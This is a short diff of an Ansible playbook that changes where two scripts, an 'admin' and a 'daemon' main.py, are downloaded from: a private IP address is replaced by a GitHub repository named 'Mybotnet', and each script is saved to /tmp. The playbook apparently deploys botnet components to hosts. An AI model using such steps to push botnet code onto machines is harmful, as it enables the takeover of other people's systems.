@@ -20,12 +20,12 @@
   tasks:
   - name: get script
     get_url:
-      url: http://172.16.1.1:8888/admin/main.py
+      url: https://github.com/magnetohvcs/Mybotnet/blob/main/admin/main.py
       dest: /tmp/admin.py
 
 - hosts: daemon
   tasks:
   - name: get script
     get_url:
-      url: http://172.16.1.1:8888/daemon/main.py
+      url: https://github.com/magnetohvcs/Mybotnet/blob/main/daemon/main.py
       dest: /tmp/daemon.py
